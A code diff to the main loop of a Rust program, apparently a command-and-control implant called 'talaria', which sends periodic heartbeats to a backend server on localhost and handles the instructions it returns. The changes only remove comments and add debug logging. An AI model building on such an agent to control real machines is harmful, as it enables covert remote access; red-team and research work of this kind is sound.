@@ -7,16 +7,12 @@ use std::time::Duration;
 use talaria::helper::*;
 use tokio::time::sleep;
 
-// FIXME:
-// Constants to be backed into the binary
-// We can look into using `include_bytes!()` in the future
 const BACKEND_SERVER_ADDR: &str = "http://127.0.0.1";
 const BACKEND_SERVER_PORT: u16 = 8000;
 const POLLING_INTERVAL_MILLIS: u64 = 10000;
 
 #[tokio::main]
 async fn main() {
-    // Create the agent context
     let mut agent = AgentContext::new(
         BACKEND_SERVER_ADDR,
         BACKEND_SERVER_PORT,
@@ -26,10 +22,13 @@ async fn main() {
     // Main agent loop
     loop {
         match network::send_heartbeat(&mut agent).await {
-            Ok(instruction) => match network::handle_response(&mut agent, instruction).await {
-                Ok(_) => {}
-                Err(err) => devlog!("Failed to handle response\n{:?}", err),
-            },
+            Ok(instruction) => {
+                devlog!("Got instruction: {:#?}", instruction);
+                match network::handle_response(&mut agent, instruction).await {
+                    Ok(_) => devlog!("Successfully handled response"),
+                    Err(err) => devlog!("Failed to handle response\n{:?}", err),
+                }
+            }
             Err(err) => devlog!("Failed to communicate with server\n{:?}", err),
         }
 
